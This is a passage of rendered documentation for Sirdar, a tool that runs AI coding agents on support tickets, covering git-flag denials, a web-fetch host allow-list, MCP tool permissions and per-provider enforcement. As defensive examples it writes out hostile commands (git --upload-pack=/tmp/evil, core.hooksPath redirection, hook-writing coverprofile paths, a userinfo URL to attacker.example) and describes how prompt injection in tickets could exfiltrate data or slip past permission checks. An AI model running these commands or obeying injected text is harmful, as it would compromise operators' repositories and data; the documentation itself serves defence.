+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"just</span><span class="nv"> </span><span class="s">*"</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"pnpm</span><span class="nv"> </span><span class="s">test*"</span>
+</code></pre></div>
+<p>Some git flags are refused whatever pattern you write, and the <code>config</code> subcommand is refused
+outright, because each of them moves where git reads its configuration, writes its output, or
+runs code from. Two groups are denied differently, by where in the command they can legally
+appear:</p>
+<ul>
+<li><code>--output</code>, <code>--output-directory</code>, <code>-o</code>, <code>--upload-pack</code> and <code>--receive-pack</code> are denied
+  wherever they fall in the command, because git accepts them after the subcommand too:
+  <code>git diff --output=~/.zshrc</code> writes a file through a pattern that was only meant to read one,
+  and <code>git fetch --upload-pack=/tmp/evil</code> runs an arbitrary program in place of git's own
+  upload-pack.</li>
+<li><code>-c</code>, <code>-C</code>, <code>--git-dir</code>, <code>--work-tree</code>, <code>--exec-path</code> and <code>--config-env</code> are top-level git
+  options, valid only <em>before</em> the subcommand, and are denied only there: <code>git -c
+  core.hooksPath=/tmp/h status</code> installs a hook directory for every git command that follows and
+  is refused, while <code>git grep -c foo</code> (counts matches) and <code>git rev-parse --git-dir</code> (prints a
+  path) reuse the same short flag after the subcommand for an unrelated meaning and are allowed.</li>
+</ul>
+<p>A <code>GIT_*</code> environment variable reaches the same configuration as those flags — <code>GIT_DIR</code>,
+<code>GIT_WORK_TREE</code> and the rest — so an assignment naming one is refused wherever it appears ahead
+of a command, git or not: <code>GIT_DIR=/tmp/other/.git git log</code>, <code>env GIT_DIR=/tmp/other/.git git
+log</code>, and <code>GIT_DIR=/tmp/other/.git make test</code>, which redirects a git invocation the Makefile
+target runs internally, are all denied. An assignment that names an unrelated variable
+(<code>LANG=C git log</code>) or a bare <code>env</code> with none (<code>env git log</code>) is not refused by this rule; the
+command underneath is still judged by everything above.</p>
+<p>What the list does not do is decide whether the session may edit files: a fix session gets
+<code>Edit</code>, <code>Write</code> and <code>MultiEdit</code> regardless, and a triage session never does. Where those may
+write is a separate rule, and not a configurable one — every edit is resolved through symlinks
+and refused unless it lands inside the workspace root, and refused again for anything under a
+<code>.git/</code> directory at any depth, under the workspace's own <code>.sirdar/</code>, or under the directory
+this repository sets <code>core.hooksPath</code> to, which Sirdar reads once at the start of the session
+(a leading <code>~</code> or <code>~user</code> in the configured value is expanded to a home directory first, the
+same way git itself expands it, so <code>core.hooksPath = ~/x</code> reserves and snapshots the directory
+git actually runs hooks from rather than a literal <code>~x</code> entry inside the workspace). The
+comparison folds case, so <code>.GIT/hooks/pre-commit</code> is the same refusal as <code>.git/hooks/pre-commit</code>
+on the case-insensitive filesystem macOS and Windows ship. A fix changes source, not hooks and
+not Sirdar's records.</p>
+<p>The same reservation reaches a <code>permissions.fixBash</code> command's own arguments, not only <code>Edit</code> and
+<code>Write</code>: a flag's path value — joined with <code>=</code>, as in <code>--coverprofile=.git/hooks/pre-commit</code>, or
+the next token after a bare flag, as in <code>-o .githooks</code> — is refused when it names a reserved
+directory, exactly as a write through <code>Edit</code> would be. <code>go test -coverprofile=.git/hooks/pre-commit</code>
+matches a <code>go test*</code> pattern and is refused anyway, because the coverage profile it names is a
+hook the next commit runs, not a coverage profile. This check is narrower than the workspace-root
+check above it: it applies only to a flag's value, not to every plain argument, so <code>cd
+.sirdar/runs &amp;&amp; ls -la</code> — reading Sirdar's own run records, not writing to them — still goes
+through.</p>
+<h3 id="what-the-allow-list-does-not-confine">What the allow-list does not confine<a class="headerlink" href="#what-the-allow-list-does-not-confine" title="Permanent link">&para;</a></h3>
+<p><code>make *</code>, <code>go test*</code>, <code>npm test*</code> and <code>dotnet test*</code> run the workspace's own build system, and
+a build system runs whatever the repository tells it to: a Makefile target, a <code>go:generate</code>
+directive, an npm <code>pretest</code> script, an MSBuild task. Sirdar does not read any of that, and no
+allow-list can — approving <code>make test</code> is approving the Makefile on the branch the session is
+standing on.</p>
+<p>That is deliberate, and it is the accepted residual of fix mode. A fix has to build and test
+what it changed or its report is worthless, and the trust it asks for is the trust you already
+extend when you check out a branch and type <code>make test</code> in your own shell. Sirdar narrows what
+an ordinary mistake or an ordinary prompt injection reaches; it is not a sandbox around a build.
+The review gate for what the session actually did is the pull request, which is the same gate
+every other change in the repository goes through. If a workspace needs more than that, run
+<code>sirdar fix</code> in a container.</p>
+<h2 id="fixprincludescomplaint"><code>fix.prIncludesComplaint</code><a class="headerlink" href="#fixprincludescomplaint" title="Permanent link">&para;</a></h2>
+<p>The pull request <code>sirdar fix</code> opens describes the symptom, the root cause, the change and the
+checks that were run. By default the symptom is the triage note's <strong>title</strong> — what broke —
+rather than the complaint, which is the customer's own words out of a support ticket:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">fix</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">prIncludesComplaint</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+</code></pre></div>
+<p>Turn it on for a private repository where the ticket text is already in front of the same
+people. Leave it off anywhere the pull request is public, or read by anyone who has no business
+with that customer's conversation. The triage note is always linked either way, through the
+tracker and helpdesk URLs in the body.</p>
+<h2 id="web-fetch">Web fetch<a class="headerlink" href="#web-fetch" title="Permanent link">&para;</a></h2>
+<p><code>permissions.fetch</code> is the list of hosts a run may retrieve a URL from. It applies to Claude
+Code's <code>WebFetch</code>, the <code>web_fetch</code> in Sirdar's own agent loop and in a qwen session, and an ACP
+agent's <code>fetch</code> permission request — one list, whichever agent is driving.</p>
+<p>It is empty by default, and empty means nothing is fetchable. That is the whole point of the
+setting. A triage session reads attacker-supplied text as a matter of routine: a ticket
+comment, a page a playbook points at, a file in the repository. Before this list existed a
+fetch was approved on the tool's name alone, so an instruction hidden in any of that text could
+name a destination of its own and carry what the session had read there in a query string. The
+destination is now judged on every call.</p>
+<p>An entry is a host, not a URL:</p>
+<table>
+<thead>
+<tr>
+<th>Entry</th>
+<th>Matches</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>docs.example.com</code></td>
+<td>that host exactly, on any port, over https</td>
+</tr>
+<tr>
+<td><code>*.example.com</code></td>
+<td>any subdomain of it, over https — <strong>not</strong> the bare <code>example.com</code></td>
+</tr>
+<tr>
+<td><code>http://localhost:3000</code></td>
+<td>a service on this machine, on that port, over http or https</td>
+</tr>
+<tr>
+<td><code>http://127.0.0.1</code></td>
+<td>the loopback address on any port</td>
+</tr>
+</tbody>
+</table>
+<p>Everything else about a URL is refused before the host is even looked at:</p>
+<ul>
+<li>a scheme other than https, unless a loopback entry above covers the host;</li>
+<li>userinfo — <code>https://docs.example.com@attacker.example/</code> is a request to <code>attacker.example</code>
+  that reads like one to the documentation host;</li>
+<li>an IP literal, which skips the name the allow-list approved, and any private, loopback,
+  link-local (<code>169.254.169.254</code>, the cloud metadata service), carrier-NAT or multicast address
+  whatever else says;</li>
+<li>a URL that does not parse, or that names no host.</li>
+</ul>
+<p>Entries are checked when the config loads: a path, a query, userinfo, a bare <code>*</code>, a wildcard
+anywhere but a leading <code>*.</code>, an <code>https://</code> prefix, or <code>http://</code> in front of anything that is
+not loopback all fail the load with a message naming <code>permissions.fetch[N]</code>. Each refused
+fetch names the host it turned down and the setting, so a run that needed a page tells you
+which line to add. <code>sirdar doctor</code> prints the list, or says that it is empty.</p>
+<p>Redirects do not widen it. Sirdar's own <code>web_fetch</code> already refuses a redirect off the host
+that was asked for, and each hop is put through the allow-list as well.</p>
+<h3 id="what-permissionsfetch-does-not-cover">What <code>permissions.fetch</code> does not cover<a class="headerlink" href="#what-permissionsfetch-does-not-cover" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong><code>WebSearch</code> / <code>web_search</code>.</strong> They carry a query, not a destination, so there is no host to
+  judge and they stay allowed. The query text is a residual channel: an injected instruction
+  can put something the session read into a search term, and the search provider sees it. If
+  that matters for your tickets, the answer is to drop the tool, not to configure this list.</li>
+<li><strong>The host's own address.</strong> A name in the list that resolves to an internal address is
+  allowed by the list. Sirdar's own fetch has a dial guard that refuses the connection on the
+  resolved IP, so a public name pointed at <code>10.0.0.5</code> gets nothing; a provider CLI doing its
+  own fetching has whatever guard it has.</li>
+<li><strong>A user-level allow rule in Claude Code.</strong> See below.</li>
+<li><strong>Codex's built-in web search.</strong> See below.</li>
+</ul>
+<h2 id="mcp-access">MCP access<a class="headerlink" href="#mcp-access" title="Permanent link">&para;</a></h2>
+<p>Two settings, and they do different jobs. <code>mcp.workspaceOnly</code> decides which servers the
+session can see at all; <code>permissions.mcp</code> decides which of their tools it may call.</p>
+<p>The setting applies to <code>provider: claude</code> and <code>provider: codex</code>. Each CLI takes a different
+route to the same place.</p>
+<p>With <code>mcp.workspaceOnly: true</code> (the default) and a <code>.mcp.json</code> in the workspace root, Sirdar
+starts the Claude session with <code>--strict-mcp-config --mcp-config &lt;workspace&gt;/.mcp.json</code>, so
+the session loads those servers and no others.</p>
+<p>Codex has no such flag. Its MCP servers come from <code>[mcp_servers.&lt;name&gt;]</code> tables in the
+<code>config.toml</code> inside <code>CODEX_HOME</code>, and neither override mechanism can subtract one:
+<code>codex app-server -c mcp_servers=...</code> and <code>thread/start</code>'s <code>config</code> object both merge into the
+configured table rather than replacing it (verified against codex-cli 0.154.0; the responses
+are in <code>docs/research/06-wire-formats.md</code>). So Sirdar generates a <code>CODEX_HOME</code> per session
+instead:</p>
+<ul>
+<li><code>config.toml</code> is the operator's own file with every <code>mcp_servers</code> declaration stripped out,
+  followed by one <code>[mcp_servers.&lt;name&gt;]</code> table per stdio server in the workspace's
+  <code>.mcp.json</code>. Model, reasoning effort, project trust and everything else they set carries
+  over verbatim, so a workspace-only run differs in its MCP servers and nothing else.</li>
+<li><code>${VAR}</code> and <code>$VAR</code> in a server's <code>args</code> and <code>env</code> are expanded as the file is written,
+  from <strong>the environment the session runs with</strong> — which is Sirdar's minus every variable a
+  configured source names as a credential. A <code>.mcp.json</code> naming one of those gets an empty
+  string and a warning naming the variable (never its value), the same as <code>provider: openai</code>
+  and <code>provider: claude</code>. That distinction is the difference between a helpdesk token staying
+  in memory and a helpdesk token written to a file on disk.</li>
+<li><code>auth.json</code> is <strong>copied</strong> in, so the session bills against the operator's login and a token
+  refresh inside a triage run cannot damage the file their own <code>codex</code> sessions read. If
+  Codex does refresh it mid-session, the new content is written back to the real file when
+  the session ends — atomically, mode 0600 — but only when that file is still byte for byte
+  what was copied. If their own <code>codex</code> moved it on meanwhile, the refresh is discarded
+  rather than overwriting theirs, and the run's <code>stderrTail</code> says which of the two happened.</li>
+<li>every other entry of their real <code>CODEX_HOME</code> — <code>sessions</code>, <code>history.jsonl</code>, the state
+  databases, <code>skills</code>, <code>plugins</code>, caches — is symlinked, so a thread started here is still on
+  disk for the resume a schema retry needs.</li>
+<li>the directory is 0700 and the files in it 0600, and it is removed once the session's
+  process has exited. Set <code>SIRDAR_KEEP_CODEX_HOME=1</code> to keep it and read the generated
+  <code>config.toml</code>. A hard kill (SIGKILL, a power cut) leaves one behind; the next session
+  sweeps <code>sirdar-codex-home-*</code> directories in <code>TMPDIR</code> that nothing has touched for 24 hours
+  and whose lock file names no live process — a session that is still running keeps its home
+  regardless of age.</li>
+</ul>
+<p><strong>"Sirdar never modifies your <code>~/.codex</code>" means <code>config.toml</code> and <code>auth.json</code>.</strong> Those two are
+copied, and <code>config.toml</code> is never written back at all; <code>auth.json</code> only under the conditions
+above. Everything else in that directory is <em>symlinked</em>, so a session writes through to the
+real files: the thread goes into your <code>sessions/</code>, the prompt into <code>history.jsonl</code>, and Codex's
+own state, log and queue databases are updated in place. That is deliberate — it is what makes
+a workspace-only run differ from an ordinary one in its MCP servers and nothing else — but it
+is a write, and worth knowing before pointing a run at a home you care about.</p>
+<p>The MCP servers Codex starts get <code>PATH</code>, <code>HOME</code>, <code>LANG</code>, <code>LOGNAME</code>, <code>SHELL</code>, <code>TERM</code>, <code>TMPDIR</code>
+and <code>USER</code>, plus whatever the server's own <code>env</code> declares — Codex's own filter, verified
+against 0.154.0, and nothing of Sirdar's environment beyond it. <code>provider: openai</code> starts the
+same servers with <code>PATH</code>, <code>HOME</code> and <code>LANG</code> plus their declared <code>env</code>. A server that needs one
+of the other five therefore works under Codex and not under the openai loop; name it in the
+server's <code>env</code> in <code>.mcp.json</code> and both will have it.</p>
+<p>One server is in every Codex thread whatever the configuration says: <code>codex_apps</code>, the CLI's
+own plugin runtime. It is part of Codex, like its shell tool, rather than something the
+operator configured, and <code>permissions.mcp</code> judges its tools by name like any other.</p>
+<p>With <code>mcp.workspaceOnly: true</code> and no such file, Sirdar passes
+<code>--strict-mcp-config --mcp-config '{"mcpServers":{}}'</code> to Claude — strict against an empty
+config — and generates a Codex home whose <code>config.toml</code> declares no servers, so
+the session has <strong>no MCP tools at all</strong>. That is the safe reading of the setting, and it is a
+change from earlier versions, which passed neither flag and let the session inherit every
+user-level server the operator had (one dogfood run saw 102 tools from six of them, including
+<code>deploy_to_vercel</code> and <code>buy_domain</code>, while <code>workspaceOnly</code> was true). A playbook that tells the
+agent to query Grafana or a database will now get nothing back until those servers are written
+into <code>&lt;workspace&gt;/.mcp.json</code>; <code>sirdar doctor</code>'s <code>mcp</code> row says which of the three states the
+workspace is in.</p>
+<p>With <code>mcp.workspaceOnly: false</code>, neither flag is passed and no Codex home is generated: the
+session inherits the operator's own MCP servers, from <code>~/.claude.json</code> or <code>~/.codex/config.toml</code>
+as the case may be. <code>permissions.mcp</code> still decides which of their tools it may call.</p>
+<p><code>provider: openai</code> is not affected by the setting, because it never had the wider reach to
+give up: the loop starts MCP servers itself, and the workspace's <code>.mcp.json</code> is the only file
+it reads.</p>
+<p><code>permissions.mcp</code> is a list of globs matched against an MCP tool's full name, e.g.
+<code>mcp__grafana__query_*</code>. While the list is empty, an <code>mcp__*</code> tool is allowed unless a word
+of its own name segment is a verb that describes a write — <code>create</code>, <code>update</code>, <code>edit</code>,
+<code>delete</code>, <code>remove</code>, <code>write</code>, <code>save</code>, <code>log</code>, <code>send</code>, <code>post</code>, <code>put</code>, <code>patch</code>, <code>deploy</code>,
+<code>pause</code>, <code>unpause</code>, <code>buy</code>, <code>purchase</code>, <code>add</code>, <code>set</code>, <code>upload</code>, <code>transition</code>, <code>assign</code>,
+<code>close</code>, <code>archive</code>, <code>cancel</code>, <code>install</code>, <code>reset</code>, <code>revoke</code> — in which case it is denied with
+<code>MCP tool &lt;name&gt; looks like a write and is not in permissions.mcp</code>. Every word is tested, not
+just the first, so <code>mcp__athena__wiki_save</code> is denied on its second word.</p>
+<p>A name that also carries a read word — <code>query</code>, <code>select</code>, <code>read</code>, <code>search</code>, <code>list</code>, <code>get</code>,
+<code>find</code>, <code>describe</code>, <code>show</code> — is treated as a read whatever else it says. That is what keeps
+<code>mcp__metabase__run_query</code> and <code>mcp__oxo-mysql-stg__run_select</code> usable; <code>run</code>, <code>exec</code>,
+<code>start</code>, <code>stop</code>, <code>schedule</code> and <code>trigger</code> are not write verbs at all, because query tools are
+routinely named that way.</p>
+<p>The server part of the name is never what is tested, so
+<code>mcp__plugin_vercel_vercel__buy_domain</code> is judged on <code>buy_domain</code>.</p>
+<p>Once the list is non-empty it is the whole rule: a tool that matches no pattern is denied,
+heuristic or not. That is the setting to use for a run you want to be read-only by
+construction rather than by naming convention.</p>
+<h3 id="how-the-permissions-reach-each-provider">How the permissions reach each provider<a class="headerlink" href="#how-the-permissions-reach-each-provider" title="Permanent link">&para;</a></h3>
+<p><code>permissions.bash</code>, <code>permissions.mcp</code> and <code>permissions.fetch</code> are one policy, applied at
+whatever point the provider offers to be asked.</p>
+<ul>
+<li><strong>claude</strong> — the CLI is started with <code>--permission-prompt-tool stdio</code>, so every tool call it
+  is not already allowed to make arrives as a <code>can_use_tool</code> request and is answered from the
+  policy. "Not already allowed" is the catch for fetches: a <code>WebFetch(domain:…)</code> rule in the
+  operator's own <code>~/.claude/settings.json</code> is an allow rule the CLI applies itself, and a call
+  it has allowed never reaches Sirdar. So while <code>permissions.fetch</code> is empty, <code>WebFetch</code> is
+  named on <code>--disallowedTools</code>, and a deny rule beats an allow rule — no fetch happens,
+  whatever the user settings say. Once the workspace names hosts, the flag comes off so the
+  policy can judge each call, and a user-level <code>WebFetch(domain:…)</code> rule then bypasses Sirdar
+  for that domain. There is no flag that switches those rules off; keep such a rule out of
+  your user settings. <code>WebFetch</code>'s own <code>prompt</code> argument is scanned for URLs the same way a
+  Qwen or gemini-style <code>web_fetch</code>'s is (see Web fetch above): a URL quoted anywhere in the
+  prompt, even one the model only meant as instructions to itself and never intended to fetch,
+  is judged against <code>permissions.fetch</code> and denies the whole call if it is not allowed. That
+  fails closed rather than open — an unrelated URL sitting in the prompt text blocks a fetch it
+  was never the destination of — which is the trade Sirdar makes on the side of not missing a
+  URL a prompt injection did mean to route through.</li>
+<li><strong>openai</strong> — the loop runs the tools itself, so it applies the policy before each call. Its
+  <code>web_fetch</code> checks <code>permissions.fetch</code> a second time inside the tool, and again on every
+  redirect hop.</li>
+<li><strong>qwen</strong> — <code>web_fetch</code> goes through the same fail-closed <code>PreToolUse</code> hook as every other
+  tool, under the name <code>WebFetch</code>, so <code>permissions.fetch</code> decides it. <code>web_search</code> is left
+  registered and allowed (no destination to judge).</li>
+<li><strong>acp</strong> — a permission request whose <code>kind</code> is <code>fetch</code> is judged as <code>WebFetch</code> against
+  <code>permissions.fetch</code>, and the kind wins over the agent's own title, so an agent cannot route
+  a fetch through the MCP rules by naming it <code>mcp__browser__get_page</code>. The URL is read out of
+  the request's <code>rawInput</code> (<code>url</code>, <code>urls</code>, or a URL written into a <code>prompt</code>); a fetch request
+  Sirdar cannot find a URL in is declined rather than approved unseen. ACP leaves it to the
+  agent to decide what is worth asking about, so an agent that fetches without asking is not
+  reached by the list at all — a completed <code>fetch</code> call that never raised a permission request
+  is reported as an <code>EvError</code> on the run.</li>
+<li><strong>codex</strong> — a triage session runs with <code>sandbox: read-only</code>, a fix session with
+  <code>sandbox: workspace-write</code>, and both with <code>approvalPolicy: untrusted</code>, so Codex asks before
+  running a shell command, calling an MCP tool or writing a file, and the policy answers.
+  <code>commandExecution</code> approvals go to <code>permissions.bash</code> (<code>permissions.fixBash</code> in a fix),
+  MCP tool-call approvals to <code>permissions.mcp</code>. A file change is refused outright in a triage
+  run; in a fix run it is judged path by path, by the same rules a Claude fix's <code>Edit</code> calls
+  go through — inside the workspace root, and not under <code>.git/</code>, <code>.sirdar/</code> or the hooks
+  directory. The paths come from the <code>fileChange</code> item that precedes the approval (including
+  any destination a rename writes to via the change's <code>kind.move_path</code>), since the approval
+  itself carries only the item's id; an approval whose paths are unknown, and a
+  request to hold a write permission open for a whole root rather than for this one patch,
+  are both declined. A request to widen the sandbox is refused whatever the settings say.
+  Every answer, allowed or refused, is an <code>EvPermission</code> line in the run's events with the
+  reason the agent was given.</li>
+</ul>
+<p>This is new, and it changes two things about a Codex run. Shell commands used to run
+  unjudged inside the sandbox — a narrow <code>permissions.bash</code> will now refuse some of what a
+  Codex session used to do, and the run's events name each one. And MCP tools used not to work
+  at all: under the previous <code>approvalPolicy: never</code> every call from the model came back
+  <code>MCP tool call requires approval, but approval policy is never</code>, so a workspace could
+  declare servers in <code>.mcp.json</code>, see them listed by <code>sirdar doctor</code>, and still get nothing
+  from them. Both transcripts are in <code>docs/research/06-wire-formats.md</code>.</p>
+<p>One limit worth knowing: the policy only sees what Codex asks about. A tool Codex decides
+  needs no approval runs without <code>permissions.mcp</code> being consulted.</p>
+<p><strong><code>permissions.fetch</code> does not reach Codex.</strong> Codex's web search and page fetching are its
+  own built-in tools, run on its side and reported to the client as a finished <code>webSearch</code>
+  item; there is no approval on the wire for them, so there is nothing for the policy to
+  answer. What governs them is Codex's own configuration: the thread runs with
+  <code>sandbox: read-only</code>, which is the app-server's whole network and filesystem setting for a
+  triage thread — <code>thread/start</code> takes the sandbox mode and no separate network flag (see
+  <code>docs/research/06-wire-formats.md</code>) — and whether the web tool exists at all is the
+  <code>web_search</code> key in the operator's <code>config.toml</code>. The per-session <code>CODEX_HOME</code> Sirdar
+  generates copies that file through with only its <code>mcp_servers</code> tables replaced, so a
+  <code>web_search = true</code> an operator set globally still applies. A workspace that wants Codex not
+  to fetch has to say so in its own <code>config.toml</code>.</p>
+<p><strong><code>item/fileChange/requestApproval</code> firing under <code>workspace-write</code> + <code>untrusted</code> is
+  schema-derived, not yet observed live.</strong> The command-approval and MCP-elicitation paths
+  above were each confirmed against a running <code>codex app-server</code> (see
+  <code>docs/research/06-wire-formats.md</code>); the file-change path was built by reading the
+  app-server's declared <code>ServerRequest</code> shape, on the same reasoning that put it there, and
+  has not itself been watched fire on an actual turn. One dogfood fix turn that has the agent
+  write through a hook — a live run, deliberately spending Codex quota — would confirm it.</p>
+<h2 id="attachment-filtering">Attachment filtering<a class="headerlink" href="#attachment-filtering" title="Permanent link">&para;</a></h2>
+<p>An attachment the helpdesk downloaded is kept only if the session could open it. Images,
+PDFs, <code>text/*</code>, JSON, CSV, XML and ZIP are kept; audio, video and anything else is deleted
+from the bundle, as is any file over <code>attachments.maxBytes</code>. Each dropped file is named, with
+its size, in the run's warnings and in the prompt, so the agent reports it as evidence it
+could not read instead of hunting for a transcoder.</p>
+<h2 id="languages">Languages<a class="headerlink" href="#languages" title="Permanent link">&para;</a></h2>
+<p>A support ticket and the note about it are rarely in the same language. Sirdar's workspace
+reads Arabic tickets from Saudi customers, writes the engineer's note in English, and replies
+to the customer in Arabic. The <code>language</code> block names both ends of that:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">language</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">notes</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">en</span>
+<span class="w">  </span><span class="nt">customer</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">auto</span>
+<span class="w">  </span><span class="nt">rtlMarkup</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+</code></pre></div>
+<p><code>notes</code> is the language of the note itself — the title, the timeline, the hypothesis, and the
+translated complaint. There is no <code>auto</code> for it: the note is written for one team, and that
+team reads one language.</p>
+<p><code>customer</code> is the language of the two fields a customer will see. <code>auto</code>, the default, means
+the language of the ticket's first customer message, which is what a helpdesk serving one
+country usually wants; a fixed code (<code>ar</code>, <code>en</code>, <code>ar-SA</code>) pins it regardless of what the
+ticket is in. Both values go into the prompt verbatim, so the session is told which language
+each field belongs in rather than inferring it.</p>
+<p>Three schema fields carry the result:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Note</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>complaintOriginal</code></td>
+<td>Triage</td>
+<td>The customer's complaint verbatim, untranslated, under <code>## Customer Complaint (original)</code> after the translated one</td>
+</tr>
+<tr>
+<td><code>customerReplyDraft</code></td>
+<td>Triage</td>
+<td><code>{language, text}</code>: a short status update the engineer could send, under <code>## Customer reply draft</code></td>
+</tr>
+<tr>
+<td><code>rca.customerSummary</code></td>
+<td>RCA</td>
+<td><code>{language, text}</code>: what happened and what was done, for the support agent to relay, under <code>## Customer summary</code></td>
+</tr>
+</tbody>
+</table>
+<p>All three are optional: a ticket already written in the note's language has no original to
+keep, and a run that stops with a question has no reply to draft. The preamble forbids a
+commitment in either customer-facing field — no fix, no cause, no date, nothing the ticket
+does not already record as promised — because these are drafts a human sends, not replies
+Sirdar sends, and nothing in Sirdar writes to a helpdesk.</p>
+<p><code>rtlMarkup</code> wraps a right-to-left paragraph the built-in templates emit in a
+<code>&lt;div dir="rtl"&gt;</code> block. Obsidian renders that HTML, so an Arabic complaint reads the way the
+customer wrote it instead of being laid out left to right. It applies to the embedded
+templates only: with <code>notes.templates</code> set, your templates own their markup and Sirdar adds
+none. The desktop app drops the wrapper and uses <code>dir="auto"</code> instead, which resolves each
+block on its own; an engineer who would rather read the whole note pane right to left can say
+so under Settings, and that preference lives in their browser, not in this file.</p>
+<h2 id="templates-override">Templates override<a class="headerlink" href="#templates-override" title="Permanent link">&para;</a></h2>
+<p>Each note type (<code>triage</code>, <code>rca</code>, <code>resolution</code>) has a Go <code>text/template</code> file. Defaults are
+embedded in the binary; setting <code>notes.templates</code> to a directory containing
+<code>triage.md.tmpl</code>, <code>rca.md.tmpl</code>, and/or <code>resolution.md.tmpl</code> overrides one or more of them
+(a missing file in that directory falls back to the embedded default for that kind).</p>
+<p><code>sirdar init --templates</code> writes the three embedded defaults into <code>.sirdar/templates</code>, ready to
+edit; point <code>notes.templates</code> at that directory to use them.</p>
+<p>Templates render against <code>{{.doc ...}}</code> (the validated note JSON), <code>{{.meta ...}}</code> (run
+metadata: key, tracker/helpdesk URLs, customer, dates, run id, provider), and <code>{{.rtlMarkup}}</code>
+(a bool, always false for an override — see Languages). Template functions:</p>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Signature</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>join</code></td>
+<td><code>join sep list</code></td>
+<td>Joins a JSON array of strings with <code>sep</code></td>
+</tr>
+<tr>
+<td><code>fill</code></td>
+<td><code>fill "NAME" value</code></td>
+<td>Renders <code>value</code>, or a visible <code>&lt;fill: NAME&gt;</code> marker when it's empty, for fields only a human can complete</td>
+</tr>
+<tr>
+<td><code>date</code></td>
+<td><code>date value</code></td>
+<td>Passes a date string through unchanged; a named place to format dates from later</td>
+</tr>
+<tr>
+<td><code>default</code></td>
+<td><code>default fallback value</code></td>
+<td>Renders <code>value</code>, or <code>fallback</code> when it's empty</td>
+</tr>
+<tr>
+<td><code>yq</code></td>
+<td><code>yq value</code></td>
+<td>Renders <code>value</code> as a YAML double-quoted, escaped scalar; used on every frontmatter value so colons, quotes, and non-Latin text can't break the frontmatter block</td>
+</tr>
+<tr>
+<td><code>rtlWrap</code></td>
+<td><code>rtlWrap .rtlMarkup value</code></td>
+<td>Wraps <code>value</code> in a <code>&lt;div dir="rtl"&gt;</code> block when it contains right-to-left script and the markup is on, else renders it unchanged</td>
+</tr>
+</tbody>
+</table>
+<p><code>sirdar doctor</code> and <code>sirdar init</code> both render every active template against a built-in sample
+document and parse the resulting frontmatter as YAML, so a broken override is caught before a
+real run rather than after.</p>
+<h2 id="providers">Providers<a class="headerlink" href="#providers" title="Permanent link">&para;</a></h2>
+<p><code>provider: claude</code> (default), <code>provider: codex</code>, <code>provider: openai</code>, <code>provider: acp</code>, or
+<code>provider: qwen</code> selects what drives runs; <code>--provider</code> on <code>triage</code> and <code>rca</code> overrides it per
+invocation.</p>
+<ul>
+<li><code>providers.claude.path</code>: path to the <code>claude</code> binary. Empty (the default) looks it up on
+  <code>PATH</code>.</li>
+<li><code>providers.codex.path</code>: path to the <code>codex</code> binary. Empty (the default) looks it up on
+  <code>PATH</code>.</li>
+<li><code>qwen.path</code>: path to the <code>qwen</code> binary. Empty (the default) looks it up on <code>PATH</code>. It sits in
+  the <code>qwen:</code> block rather than under <code>providers:</code> because the rest of that block — the
+  endpoint — belongs with it.</li>
+<li><code>billing: subscription</code> (default) removes <code>ANTHROPIC_API_KEY</code> from the agent's child
+  environment so the run authenticates with the CLI's own login and draws on your subscription.
+  <code>billing: api</code> leaves the key in place, so the run is billed per token against that key
+  instead.</li>
+<li><code>billing: subscription</code> also removes <code>ANTHROPIC_BASE_URL</code>, <code>ANTHROPIC_AUTH_TOKEN</code>,
+  <code>ANTHROPIC_CUSTOM_HEADERS</code>, <code>CLAUDE_CODE_USE_BEDROCK</code>, <code>CLAUDE_CODE_USE_VERTEX</code>, and
+  <code>CLAUDE_CODE_USE_FOUNDRY</code> from the agent's child environment, one <code>EvSystem</code> event per variable
+  removed. None of them has a legitimate role in a subscription-billed run, and leaving
+  <code>ANTHROPIC_BASE_URL</code> in place is what turns a stray shell export into a credential leak: with
+  no gateway credential of its own, the CLI keeps your claude.ai OAuth login active and sends it
+  to whatever host the base URL names. <code>sirdar doctor</code>'s <code>claude environment</code> row fails when any
+  of these is set in your process environment while <code>billing: subscription</code> is in effect, and
+  names which ones Sirdar is about to strip. <code>billing: api</code> passes all of them through unchanged
+  — this is the supported way to point Sirdar at an Anthropic-compatible endpoint you control
+  (Ollama, llama.cpp, a vendor gateway) — but the CLI's reported cost is fabricated behind a
+  custom <code>ANTHROPIC_BASE_URL</code>, so <code>budget.maxUsd</code> cannot be trusted there; <code>doctor</code> reports the
+  host (never the full URL) as a reminder. See
+  <code>docs/research/providers/spike-anthropic-compatible.md</code> for the full investigation.</li>
+</ul>
+<h3 id="provider-qwen"><code>provider: qwen</code><a class="headerlink" href="#provider-qwen" title="Permanent link">&para;</a></h3>
+<p><a href="https://github.com/QwenLM/qwen-code">Qwen Code</a> is a Gemini CLI fork whose headless mode is
+modelled on Claude Code's, and despite the name it is not Qwen-only: it talks to any
+OpenAI-compatible endpoint. It is the one third-party runtime that meets the whole of Sirdar's
+contract natively — streaming events, schema-constrained output, resume, MCP, and a per-call
+permission decision the host makes.</p>
+<p>Install it with <code>npm i -g @qwen-code/qwen-code</code>. With no <code>qwen:</code> block the session runs against
+whatever login the CLI already has:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">provider</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">qwen</span>
+</code></pre></div>
+<p>Name an endpoint to point it somewhere else. The three fields go together — Qwen Code selects
+its OpenAI-compatible backend only when a key, a base URL and a model are all present — so a
+local server that checks no key still needs one named:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">provider</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">qwen</span>
+<span class="nt">qwen</span><span class="p">:</span>
